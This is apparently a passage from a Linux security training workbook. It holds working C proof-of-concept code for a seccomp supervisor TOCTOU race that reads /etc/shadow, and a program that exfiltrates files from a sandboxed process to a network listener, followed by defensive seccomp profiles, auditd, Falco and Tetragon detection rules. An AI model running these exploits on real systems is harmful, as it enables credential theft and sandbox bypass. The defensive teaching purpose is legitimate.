// seccomp_toctou.c — Exploit TOCTOU in seccomp user-notification supervisor
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <stddef.h>
#include <errno.h>
#include <signal.h>

// seccomp user notification structures (may need kernel headers 5.0+)
#ifndef SECCOMP_IOCTL_NOTIF_RECV
struct seccomp_notif {
    __u64 id;
    __u32 pid;
    __u32 flags;
    struct seccomp_data data;
};

struct seccomp_notif_resp {
    __u64 id;
    __s32 val;
    __u32 error;
    __u32 flags;
};

#define SECCOMP_IOCTL_NOTIF_RECV   _IOWR('!', 0, struct seccomp_notif)
#define SECCOMP_IOCTL_NOTIF_SEND   _IOWR('!', 1, struct seccomp_notif_resp)
#define SECCOMP_IOCTL_NOTIF_ID_VALID _IOW('!', 2, __u64)
#endif

static volatile int race_ready = 0;
static char *shared_path = NULL;

// Thread that changes the path after supervisor reads it
void *race_thread(void *arg) {
    while (!race_ready) {
        __asm__ volatile("pause");
    }
    
    // Change the safe path to the target path
    // The supervisor already read and approved the safe path
    strcpy(shared_path, "/etc/shadow");
    
    printf("[racer] Path changed to /etc/shadow after supervisor check\n");
    return NULL;
}

// Vulnerable supervisor (reads memory of supervised process to validate paths)
void *supervisor_thread(void *arg) {
    int notify_fd = *(int *)arg;
    struct seccomp_notif notif;
    struct seccomp_notif_resp resp;
    char path_buf[256];
    
    printf("[supervisor] Waiting for notifications on fd=%d\n", notify_fd);
    
    while (1) {
        memset(&notif, 0, sizeof(notif));
        if (ioctl(notify_fd, SECCOMP_IOCTL_NOTIF_RECV, &notif) < 0) {
            if (errno == EINTR) continue;
            perror("SECCOMP_IOCTL_NOTIF_RECV");
            break;
        }
        
        printf("[supervisor] Got notification: pid=%d, syscall=%d\n",
               notif.pid, notif.data.nr);
        
        // Read the path argument from the supervised process's memory
        // BUG: TOCTOU — the supervised process can change this memory
        // between our read and our response
        char proc_mem[64];
        snprintf(proc_mem, sizeof(proc_mem), "/proc/%d/mem", notif.pid);
        int mem_fd = open(proc_mem, O_RDONLY);
        if (mem_fd >= 0) {
            // Read the pathname argument (arg1 of openat)
            lseek(mem_fd, notif.data.args[1], SEEK_SET);
            int n = read(mem_fd, path_buf, sizeof(path_buf) - 1);
            close(mem_fd);
            
            if (n > 0) {
                path_buf[n] = '\0';
                printf("[supervisor] Path read: '%s'\n", path_buf);
                
                // Policy check: only allow /tmp/* paths
                if (strncmp(path_buf, "/tmp/", 5) == 0) {
                    printf("[supervisor] APPROVED: path starts with /tmp/\n");
                    
                    // Signal the racer that we've completed the check
                    race_ready = 1;
                    
                    // Simulate processing delay (TOCTOU window)
                    usleep(1000);
                    
                    // Respond with ALLOW
                    resp.id = notif.id;
                    resp.error = 0;
                    resp.val = 0;
                    resp.flags = SECCOMP_USER_NOTIF_FLAG_CONTINUE;
                    
                    if (ioctl(notify_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp) < 0) {
                        perror("SECCOMP_IOCTL_NOTIF_SEND");
                    }
                    continue;
                } else {
                    printf("[supervisor] DENIED: path '%s' not in /tmp/\n", path_buf);
                }
            }
        }
        
        // Default: deny
        resp.id = notif.id;
        resp.error = -EPERM;
        resp.val = 0;
        resp.flags = 0;
        ioctl(notify_fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
    }
    
    return NULL;
}

int main(void) {
    printf("=== Seccomp User-Notification TOCTOU Attack ===\n\n");
    
    // Allocate shared path buffer (mmap for cross-thread visibility)
    shared_path = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    strcpy(shared_path, "/tmp/safe_file");  // Initially safe
    
    printf("[*] shared_path initially = '%s'\n", shared_path);
    printf("[*] Attack: change to '/etc/shadow' after supervisor reads it\n\n");
    
    // Install seccomp filter with USER_NOTIF on openat
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        // openat → USER_NOTIF
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_openat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_USER_NOTIF),
        // Everything else → ALLOW
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    
    // Use seccomp() syscall with SECCOMP_FILTER_FLAG_NEW_LISTENER
    int notify_fd = syscall(SYS_seccomp, SECCOMP_SET_MODE_FILTER,
                            SECCOMP_FILTER_FLAG_NEW_LISTENER, &prog);
    if (notify_fd < 0) {
        perror("seccomp(NEW_LISTENER)");
        printf("    Requires kernel 5.0+ for SECCOMP_FILTER_FLAG_NEW_LISTENER\n");
        return 1;
    }
    printf("[+] Seccomp notification fd = %d\n", notify_fd);
    
    // Start supervisor thread
    pthread_t sup_tid, race_tid;
    pthread_create(&sup_tid, NULL, supervisor_thread, &notify_fd);
    
    // Start racer thread
    pthread_create(&race_tid, NULL, race_thread, NULL);
    
    // Give supervisor time to start
    usleep(100000);
    
    // Attempt openat with the shared_path (initially /tmp/safe_file)
    printf("[main] Calling openat(shared_path='%s')...\n", shared_path);
    int fd = openat(AT_FDCWD, shared_path, O_RDONLY);
    
    if (fd >= 0) {
        char buf[256] = {0};
        read(fd, buf, sizeof(buf) - 1);
        printf("[+] TOCTOU SUCCESS! Opened: '%s'\n", shared_path);
        printf("[+] Content: %s\n", buf);
        close(fd);
    } else {
        printf("[-] openat failed: %s\n", strerror(errno));
        printf("    (Race timing may need adjustment)\n");
    }
    
    printf("\n[*] Mitigation:\n");
    printf("    - Use SECCOMP_IOCTL_NOTIF_ID_VALID to recheck\n");
    printf("    - Copy path to supervisor memory before validation\n");
    printf("    - Use SECCOMP_ADDFD_FLAG_SETFD to inject pre-opened fds\n");
    
    // Cleanup
    pthread_cancel(sup_tid);
    munmap(shared_path, 4096);
    close(notify_fd);
    
    return 0;
}
```

---

### Exercise 8: Exploitation Under Seccomp — Data Exfiltration Without execve

**Objective:** Demonstrate techniques for exfiltrating data from a process sandboxed by seccomp that blocks execve, execveat, and most file operations.

```c
// constrained_exfil.c — Data exfiltration under tight seccomp sandbox
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <stddef.h>
#include <fcntl.h>
#include <errno.h>

// Technique 1: sendfile() — transfers between fds without userspace buffers
int exfil_sendfile(int sock_fd, const char *target_file) {
    int file_fd = open(target_file, O_RDONLY);
    if (file_fd < 0) return -1;
    
    off_t offset = 0;
    ssize_t sent = sendfile(sock_fd, file_fd, &offset, 65536);
    close(file_fd);
    
    printf("[sendfile] Exfiltrated %zd bytes from '%s'\n", sent, target_file);
    return sent > 0 ? 0 : -1;
}

// Technique 2: splice() — zero-copy transfer via pipe
int exfil_splice(int sock_fd, const char *target_file) {
    int file_fd = open(target_file, O_RDONLY);
    if (file_fd < 0) return -1;
    
    int pipefd[2];
    if (pipe(pipefd) < 0) { close(file_fd); return -1; }
    
    // splice file→pipe, then pipe→socket
    ssize_t n = splice(file_fd, NULL, pipefd[1], NULL, 65536, SPLICE_F_MOVE);
    if (n > 0) {
        splice(pipefd[0], NULL, sock_fd, NULL, n, SPLICE_F_MOVE);
        printf("[splice] Exfiltrated %zd bytes from '%s'\n", n, target_file);
    }
    
    close(pipefd[0]); close(pipefd[1]); close(file_fd);
    return n > 0 ? 0 : -1;
}

// Technique 3: memfd_create + write = in-memory file (for fd passing)
int exfil_memfd(int sock_fd, const char *data, size_t len) {
    int memfd = syscall(319, "exfil", MFD_CLOEXEC);  // memfd_create
    if (memfd < 0) return -1;
    
    write(memfd, data, len);
    lseek(memfd, 0, SEEK_SET);
    
    // sendfile from memfd to socket
    off_t offset = 0;
    ssize_t sent = sendfile(sock_fd, memfd, &offset, len);
    close(memfd);
    
    printf("[memfd] Exfiltrated %zd bytes via memfd\n", sent);
    return sent > 0 ? 0 : -1;
}

// Technique 4: Process exit code (8 bits per exit)
void exfil_exit_code(const char *secret, size_t len) {
    printf("[exit_code] Exfiltrating %zu bytes via exit codes...\n", len);
    printf("    Parent process reads child exit status for each byte.\n");
    printf("    Each fork() → child exits with one byte → parent reads WEXITSTATUS\n\n");
    
    for (size_t i = 0; i < len && i < 32; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            _exit((unsigned char)secret[i]);
        }
        int status;
        waitpid(pid, &status, 0);
        printf("    Byte %zu: 0x%02x '%c'\n", i,
               WEXITSTATUS(status),
               WEXITSTATUS(status) >= 32 ? WEXITSTATUS(status) : '.');
    }
}

// Technique 5: Timing side-channel (bit-by-bit via observable delays)
void exfil_timing(unsigned char byte) {
    printf("[timing] Exfiltrating byte 0x%02x via timing:\n", byte);
    for (int bit = 7; bit >= 0; bit--) {
        if (byte & (1 << bit)) {
            // Bit=1: busy-wait (observable externally)
            volatile unsigned long x = 0;
            for (unsigned long i = 0; i < 50000000; i++) x++;
            printf("    bit %d = 1 (long delay)\n", bit);
        } else {
            // Bit=0: fast return
            printf("    bit %d = 0 (short delay)\n", bit);
        }
    }
}

void install_restrictive_sandbox(void) {
    struct sock_filter filter[] = {
        // Validate arch
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        // Block execve/execveat
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 59, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 322, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
        // Block mprotect with PROT_EXEC (no shellcode injection)
        // (would need argument inspection — simplified here)
        // Allow: read, write, open, close, socket, sendfile, splice, pipe,
        //        mmap, fork, exit, exit_group, memfd_create
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
}

int main(int argc, char *argv[]) {
    printf("=== Data Exfiltration Under Seccomp Constraints ===\n\n");
    
    const char *exfil_target = argc > 1 ? argv[1] : "/etc/hostname";
    const char *exfil_dest = argc > 2 ? argv[2] : "127.0.0.1";
    int exfil_port = 4444;
    
    // Pre-open a socket BEFORE installing seccomp (or use already-open fd)
    int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(exfil_port),
    };
    inet_pton(AF_INET, exfil_dest, &addr.sin_addr);
    
    printf("[*] Techniques available when execve is blocked:\n");
    printf("    1. sendfile(socket, file) — zero-copy file→network\n");
    printf("    2. splice(file→pipe→socket) — kernel-level transfer\n");
    printf("    3. memfd_create + sendfile — in-memory staging\n");
    printf("    4. Exit codes — 8 bits per fork/exit cycle\n");
    printf("    5. Timing channels — bit-by-bit via delays\n\n");
    
    // Install sandbox
    printf("[*] Installing restrictive seccomp filter...\n");
    install_restrictive_sandbox();
    printf("[+] Sandbox active (execve blocked)\n\n");
    
    // Verify execve is blocked
    printf("[*] Verifying execve is blocked...\n");
    if (execve("/bin/sh", NULL, NULL) < 0) {
        // If we get here (not killed), errno should be set
        printf("[+] execve returned error (not killed — filter uses ERRNO not KILL)\n");
    }
    
    // Attempt connection for network-based exfil
    if (connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
        printf("[+] Connected to %s:%d\n\n", exfil_dest, exfil_port);
        
        printf("[*] Technique 1: sendfile()\n");
        exfil_sendfile(sock_fd, exfil_target);
        
        printf("\n[*] Technique 2: splice()\n");
        exfil_splice(sock_fd, exfil_target);
        
        printf("\n[*] Technique 3: memfd_create()\n");
        exfil_memfd(sock_fd, "SECRET_DATA_HERE\n", 17);
    } else {
        printf("[-] Connection to %s:%d failed (start listener: nc -l %d)\n",
               exfil_dest, exfil_port, exfil_port);
    }
    
    // Non-network techniques always work
    printf("\n[*] Technique 4: Exit code exfiltration\n");
    exfil_exit_code("SECRET", 6);
    
    printf("\n[*] Technique 5: Timing channel (1 byte demo)\n");
    exfil_timing('A');
    
    close(sock_fd);
    printf("\n[+] Exfiltration complete\n");
    return 0;
}
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Comprehensive Seccomp Profile Generation and Deployment

**Objective:** Build a complete pipeline for generating minimal seccomp profiles from workload observation, deploying them in Docker/Kubernetes, and monitoring violations.

**Step 1: Automated seccomp profile generator**

```python
#!/usr/bin/env python3
"""seccomp_profiler.py — Generate OCI seccomp profiles from workload observation"""

import subprocess
import json
import sys
import os
import re
import time
from pathlib import Path
from collections import Counter

ARCH_MAP = {
    "x86_64": "SCMP_ARCH_X86_64",
    "x86": "SCMP_ARCH_X86",
    "aarch64": "SCMP_ARCH_AARCH64",
    "arm": "SCMP_ARCH_ARM",
}

# Syscalls that should NEVER be allowed in containers
DANGEROUS_SYSCALLS = {
    "kexec_load", "kexec_file_load", "reboot",
    "init_module", "finit_module", "delete_module",
    "mount", "umount2", "pivot_root",
    "swapon", "swapoff",
    "acct", "settimeofday", "clock_settime",
    "add_key", "keyctl", "request_key",
    "io_uring_setup", "io_uring_enter", "io_uring_register",
    "bpf",
    "perf_event_open",
    "ptrace",
    "process_vm_readv", "process_vm_writev",
    "kcmp", "lookup_dcookie",
    "open_by_handle_at",
    "create_module", "get_kernel_syms", "query_module",
    "nfsservctl",
    "unshare",  # if user namespaces should be blocked
}

# io_uring syscalls (block by default)
IO_URING_SYSCALLS = {"io_uring_setup", "io_uring_enter", "io_uring_register"}


def trace_syscalls_strace(command: list, duration: int = 30) -> set:
    """Trace syscalls using strace"""
    print(f"[*] Tracing with strace for {duration}s: {' '.join(command)}")
    
    trace_file = f"/tmp/strace_{os.getpid()}.log"
    proc = subprocess.Popen(
        ["strace", "-f", "-o", trace_file, "-e", "trace=all", "--"] + command,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    
    time.sleep(duration)
    proc.terminate()
    proc.wait()
    
    syscalls = set()
    pattern = re.compile(r'^\d+\s+(\w+)\(')
    
    with open(trace_file) as f:
        for line in f:
            match = pattern.match(line)
            if match:
                syscalls.add(match.group(1))
    
    os.unlink(trace_file)
    return syscalls


def trace_syscalls_audit(pid: int, duration: int = 30) -> set:
    """Trace syscalls using auditd (for running processes)"""
    print(f"[*] Tracing PID {pid} via audit for {duration}s...")
    
    # Add audit rule
    subprocess.run(
        ["auditctl", "-a", "always,exit", "-F", f"pid={pid}",
         "-S", "all", "-k", "seccomp_profiling"],
        check=True, capture_output=True
    )
    
    time.sleep(duration)
    
    # Remove rule
    subprocess.run(
        ["auditctl", "-d", "always,exit", "-F", f"pid={pid}",
         "-S", "all", "-k", "seccomp_profiling"],
        capture_output=True
    )
    
    # Parse audit log
    result = subprocess.run(
        ["ausearch", "-k", "seccomp_profiling", "--format", "text"],
        capture_output=True, text=True
    )
    
    syscalls = set()
    for line in result.stdout.splitlines():
        match = re.search(r'syscall=(\w+)', line)
        if match:
            syscalls.add(match.group(1))
    
    return syscalls


def generate_oci_profile(syscalls: set, arch: str = "x86_64",
                         default_action: str = "SCMP_ACT_ERRNO",
                         block_dangerous: bool = True) -> dict:
    """Generate OCI-format seccomp profile"""
    
    allowed = syscalls.copy()
    
    if block_dangerous:
        blocked = allowed & DANGEROUS_SYSCALLS
        if blocked:
            print(f"[!] Removing dangerous syscalls from allowlist: {blocked}")
            allowed -= DANGEROUS_SYSCALLS
    
    # Always remove io_uring
    allowed -= IO_URING_SYSCALLS
    
    profile = {
        "defaultAction": default_action,
        "defaultErrnoRet": 1,
        "architectures": [ARCH_MAP.get(arch, "SCMP_ARCH_X86_64")],
        "syscalls": [
            {
                "names": sorted(list(allowed)),
                "action": "SCMP_ACT_ALLOW"
            }
        ]
    }
    
    # Add argument restrictions for sensitive syscalls
    arg_restrictions = []
    
    if "mprotect" in allowed:
        arg_restrictions.append({
            "names": ["mprotect", "mmap"],
            "action": "SCMP_ACT_ALLOW",
            "args": [
                {
                    "index": 2,
                    "value": 4,  # PROT_EXEC
                    "valueTwo": 4,
                    "op": "SCMP_CMP_MASKED_EQ"
                }
            ],
            "comment": "Block PROT_EXEC in mprotect/mmap (prevents shellcode)"
        })
    
    if "clone" in allowed:
        arg_restrictions.append({
            "names": ["clone", "clone3"],
            "action": "SCMP_ACT_ERRNO",
            "errnoRet": 1,
            "args": [
                {
                    "index": 0,
                    "value": 0x10000000,  # CLONE_NEWUSER
                    "valueTwo": 0x10000000,
                    "op": "SCMP_CMP_MASKED_EQ"
                }
            ],
            "comment": "Block CLONE_NEWUSER (prevents namespace escalation)"
        })
    
    if arg_restrictions:
        profile["syscalls"].extend(arg_restrictions)
    
    return profile


def analyze_profile_security(profile: dict) -> dict:
    """Security analysis of a generated profile"""
    allowed = set()
    for rule in profile.get("syscalls", []):
        if rule.get("action") == "SCMP_ACT_ALLOW":
            allowed.update(rule.get("names", []))
    
    risks = []
    
    dangerous_allowed = allowed & DANGEROUS_SYSCALLS
    if dangerous_allowed:
        risks.append({
            "severity": "CRITICAL",
            "issue": f"Dangerous syscalls allowed: {dangerous_allowed}",
            "recommendation": "Remove from allowlist or add argument restrictions"
        })
    
    if "ptrace" in allowed:
        risks.append({
            "severity": "HIGH",
            "issue": "ptrace allowed — enables process injection",
            "recommendation": "Remove unless debugging is required"
        })
    
    if "ioctl" in allowed:
        risks.append({
            "severity": "MEDIUM",
            "issue": "ioctl allowed without restriction — broad kernel interface",
            "recommendation": "Consider argument filtering for specific ioctl commands"
        })
    
    iouring_present = allowed & IO_URING_SYSCALLS
    if iouring_present:
        risks.append({
            "severity": "CRITICAL",
            "issue": f"io_uring syscalls allowed: {iouring_present}",
            "recommendation": "Block io_uring — persistent source of kernel privesc"
        })
    
    if "unshare" in allowed:
        risks.append({
            "severity": "HIGH",
            "issue": "unshare allowed — enables namespace creation for privilege escalation",
            "recommendation": "Block or add CLONE_NEWUSER argument restriction"
        })
    
    return {
        "total_allowed": len(allowed),
        "risk_count": len(risks),
        "risks": risks,
        "score": max(0, 100 - len(risks) * 15 - len(dangerous_allowed) * 25),
    }


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Seccomp profile generator")
    parser.add_argument("--command", nargs="+", help="Command to trace")
    parser.add_argument("--pid", type=int, help="PID to trace (audit-based)")
    parser.add_argument("--duration", type=int, default=30, help="Trace duration (seconds)")
    parser.add_argument("--output", default="seccomp-profile.json", help="Output file")
    parser.add_argument("--analyze", type=str, help="Analyze existing profile")
    parser.add_argument("--default-action", default="SCMP_ACT_ERRNO",
                        choices=["SCMP_ACT_ERRNO", "SCMP_ACT_KILL_PROCESS", "SCMP_ACT_LOG"])
    args = parser.parse_args()
    
    if args.analyze:
        with open(args.analyze) as f:
            profile = json.load(f)
        analysis = analyze_profile_security(profile)
        print(f"\n{'='*60}")
        print(f"Security Analysis: {args.analyze}")
        print(f"{'='*60}")
        print(f"Allowed syscalls: {analysis['total_allowed']}")
        print(f"Security score: {analysis['score']}/100")
        print(f"Risk findings: {analysis['risk_count']}")
        for risk in analysis['risks']:
            print(f"  [{risk['severity']}] {risk['issue']}")
            print(f"    → {risk['recommendation']}")
        return
    
    if args.command:
        syscalls = trace_syscalls_strace(args.command, args.duration)
    elif args.pid:
        syscalls = trace_syscalls_audit(args.pid, args.duration)
    else:
        parser.error("Provide --command or --pid")
        return
    
    print(f"\n[+] Observed {len(syscalls)} unique syscalls")
    print(f"    {sorted(syscalls)}")
    
    profile = generate_oci_profile(syscalls, default_action=args.default_action)
    
    with open(args.output, "w") as f:
        json.dump(profile, f, indent=2)
    print(f"\n[+] Profile written to: {args.output}")
    
    analysis = analyze_profile_security(profile)
    print(f"[+] Security score: {analysis['score']}/100")
    if analysis['risks']:
        print("[!] Risks found:")
        for risk in analysis['risks']:
            print(f"    [{risk['severity']}] {risk['issue']}")


if __name__ == "__main__":
    main()
```

**Step 2: Docker deployment with custom profile**

```bash
# Generate profile for nginx
python3 seccomp_profiler.py --command nginx -g "daemon off;" --duration 60 \
    --output nginx-seccomp.json --default-action SCMP_ACT_KILL_PROCESS

# Test in log-only mode first
docker run --rm \
    --security-opt seccomp=nginx-seccomp.json \
    -p 8080:80 \
    nginx:alpine

# Monitor violations
journalctl -k --since "5 min ago" | grep SECCOMP
```

**Step 3: Kubernetes SeccompProfile deployment**

```yaml
# seccomp-profile-configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: seccomp-profiles
  namespace: kube-system
data:
  strict-webapp.json: |
    {
      "defaultAction": "SCMP_ACT_ERRNO",
      "defaultErrnoRet": 1,
      "architectures": ["SCMP_ARCH_X86_64"],
      "syscalls": [
        {
          "names": ["read", "write", "close", "fstat", "lseek", "mmap",
                    "mprotect", "munmap", "brk", "rt_sigaction", "rt_sigprocmask",
                    "ioctl", "access", "pipe", "select", "sched_yield",
                    "mremap", "msync", "clone", "execve", "exit", "wait4",
                    "kill", "uname", "fcntl", "flock", "fsync", "fdatasync",
                    "getdents64", "getcwd", "chdir", "openat", "newfstatat",
                    "socket", "connect", "accept4", "sendto", "recvfrom",
                    "bind", "listen", "getsockname", "getpeername",
                    "setsockopt", "getsockopt", "epoll_create1", "epoll_ctl",
                    "epoll_wait", "futex", "set_robust_list",
                    "clock_gettime", "exit_group", "getpid", "getuid",
                    "getgid", "geteuid", "getegid", "getppid", "pread64",
                    "pwrite64", "getrandom", "statx", "rseq"],
          "action": "SCMP_ACT_ALLOW"
        },
        {
          "names": ["clone", "clone3"],
          "action": "SCMP_ACT_ERRNO",
          "errnoRet": 1,
          "args": [{"index": 0, "value": 268435456, "valueTwo": 268435456, "op": "SCMP_CMP_MASKED_EQ"}]
        }
      ]
    }
---
# pod-with-seccomp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hardened-webapp
  annotations:
    seccomp.security.alpha.kubernetes.io/pod: localhost/strict-webapp.json
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/strict-webapp.json
    runAsNonRoot: true
    runAsUser: 1000
  containers:
  - name: webapp
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
      readOnlyRootFilesystem: true
```

---

### Exercise 10: Kernel Subsystem Detection Engineering — Multi-Layer Monitoring

**Objective:** Deploy comprehensive detection covering all kernel subsystem attack surfaces using auditd, Falco, and Tetragon, with correlation rules.

**Step 1: Complete auditd configuration**

```bash
#!/bin/bash
# deploy_audit_rules.sh — Deploy kernel subsystem monitoring rules

cat > /etc/audit/rules.d/90-kernel-subsystem.rules << 'RULES'
## Kernel Subsystem Attack Surface Monitoring
## Last updated: 2025-01-15

# Delete existing rules
-D

# Set buffer and rate
-b 8192
-r 0
--backlog_wait_time 60000

## === SECCOMP ===
-a always,exit -F arch=b64 -S seccomp -k seccomp_ops
-a always,exit -F arch=b64 -S prctl -F a0=22 -k seccomp_prctl
-a always,exit -F arch=b64 -S prctl -F a0=38 -k no_new_privs

## === eBPF ===
-a always,exit -F arch=b64 -S bpf -k ebpf_ops

## === io_uring ===
-a always,exit -F arch=b64 -S io_uring_setup -k io_uring_setup
-a always,exit -F arch=b64 -S io_uring_enter -k io_uring_enter
-a always,exit -F arch=b64 -S io_uring_register -k io_uring_reg

## === Namespace Operations ===
-a always,exit -F arch=b64 -S unshare -k namespace_unshare
-a always,exit -F arch=b64 -S setns -k namespace_setns
-a always,exit -F arch=b64 -S clone3 -k namespace_clone3

## === Kernel Modules ===
-a always,exit -F arch=b64 -S init_module -k kmod_load
-a always,exit -F arch=b64 -S finit_module -k kmod_load
-a always,exit -F arch=b64 -S delete_module -k kmod_unload

## === Mount Operations (container escapes) ===
-a always,exit -F arch=b64 -S mount -k mount_ops
-a always,exit -F arch=b64 -S umount2 -k mount_ops
-a always,exit -F arch=b64 -S pivot_root -k mount_ops

## === Proc/Sys writes ===
-w /proc/sys/kernel/core_pattern -p wa -k proc_corepattern
-w /proc/sys/kernel/modprobe -p wa -k proc_modprobe
-w /proc/sysrq-trigger -p wa -k proc_sysrq

## === Cgroup modification ===
-w /sys/fs/cgroup -p wa -k cgroup_write

## === Device access ===
-a always,exit -F arch=b64 -S openat -F path=/dev/mem -k dev_mem
-a always,exit -F arch=b64 -S openat -F path=/dev/kmem -k dev_kmem

## === TTY injection ===
-a always,exit -F arch=b64 -S ioctl -F a1=0x5412 -k tiocsti

## === Ptrace ===
-a always,exit -F arch=b64 -S ptrace -k ptrace_ops
-a always,exit -F arch=b64 -S process_vm_readv -k proc_mem_rw
-a always,exit -F arch=b64 -S process_vm_writev -k proc_mem_rw

## === Credential changes ===
-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid!=0 -k priv_escalation
-a always,exit -F arch=b64 -S setresuid -F a0=0 -F auid!=0 -k priv_escalation

## === Netfilter ===
-w /usr/sbin/nft -p x -k nft_exec
-w /usr/sbin/iptables -p x -k netfilter_exec

## Make rules immutable (requires reboot to change)
-e 2
RULES

# Reload
augenrules --load
auditctl -l | wc -l
echo "[+] Audit rules deployed"
```

**Step 2: Falco rules for container escape detection**

```yaml
# /etc/falco/rules.d/subsystem-attacks.yaml

- rule: Cgroup release_agent Write
  desc: Write to cgroup release_agent (container escape)
  condition: >
    (evt.type in (open, openat) and
     fd.name contains "release_agent" and
     evt.arg.flags contains O_WRONLY) or
    (evt.type = write and fd.name contains "release_agent")
  output: >
    Cgroup release_agent modified (user=%user.name
    container=%container.id pid=%proc.pid proc=%proc.name
    file=%fd.name)
  priority: CRITICAL
  tags: [container_escape, cgroup, mitre_privilege_escalation]

- rule: core_pattern Write from Container
  desc: Write to /proc/sys/kernel/core_pattern from container
  condition: >
    container and
    evt.type in (open, openat) and
    fd.name = "/proc/sys/kernel/core_pattern" and
    evt.arg.flags contains O_WRONLY
  output: >
    core_pattern write from container (user=%user.name
    container=%container.id proc=%proc.name)
  priority: CRITICAL
  tags: [container_escape, proc_write]

- rule: io_uring in Container
  desc: io_uring_setup called from within a container
  condition: container and evt.type = io_uring_setup
  output: >
    io_uring_setup in container (container=%container.id
    proc=%proc.name pid=%proc.pid user=%user.name)
  priority: HIGH
  tags: [io_uring, seccomp_bypass, kernel_exploit]

- rule: eBPF Program Load Non-Standard
  desc: BPF program loaded by unexpected process
  condition: >
    evt.type = bpf and
    not proc.name in (cilium-agent, falco, tracee-ebpf, tetragon,
                      bpftrace, systemd, containerd)
  output: >
    Unexpected BPF load (proc=%proc.name pid=%proc.pid
    uid=%user.uid container=%container.id)
  priority: HIGH
  tags: [ebpf, privilege_escalation]

- rule: Excessive ptmx Opens
  desc: Process opening many /dev/ptmx (TTY heap spray indicator)
  condition: >
    evt.type in (open, openat) and
    fd.name = "/dev/ptmx" and
    evt.count[proc.pid] > 32
  output: >
    Excessive /dev/ptmx opens (proc=%proc.name pid=%proc.pid
    count=%evt.count[proc.pid] — possible heap spray)
  priority: HIGH
  tags: [heap_spray, kernel_exploit, tty]

- rule: User Namespace then Netfilter Operation
  desc: User namespace creation followed by netfilter manipulation
  condition: >
    evt.type = sendmsg and
    fd.type = netlink and
    proc.aname[1] = "unshare"
  output: >
    Netfilter operation in user namespace context (proc=%proc.name
    pid=%proc.pid — possible nf_tables exploit)
  priority: CRITICAL
  tags: [nf_tables, namespace_escape, privilege_escalation]

- rule: Sensitive File Read After Privilege Change
  desc: Reading sensitive files shortly after credential change
  condition: >
    (evt.type in (open, openat) and
     fd.name in (/etc/shadow, /etc/sudoers, /root/.ssh/id_rsa,
                 /var/run/secrets/kubernetes.io/serviceaccount/token) and
     proc.auid != 0 and user.uid = 0)
  output: >
    Sensitive file access after privilege escalation (file=%fd.name
    proc=%proc.name uid=%user.uid auid=%proc.auid)
  priority: CRITICAL
  tags: [post_exploitation, credential_access]
```

**Step 3: Tetragon enforcement policy**

```yaml
# tetragon-subsystem-policy.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: kernel-subsystem-enforcement
spec:
  kprobes:
    # Kill any process attempting BPF_PROG_LOAD from non-host namespace
    - call: security_bpf
      syscall: false
      args:
        - index: 0
          type: int
      selectors:
        - matchArgs:
            - index: 0
              operator: Equal
              values: ["5"]  # BPF_PROG_LOAD
          matchNamespaces:
            - namespace: Pid
              operator: NotIn
              values: ["4026531836"]
          matchActions:
            - action: Sigkill

    # Kill process writing to release_agent from container
    - call: security_file_open
      syscall: false
      args:
        - index: 0
          type: file
      selectors:
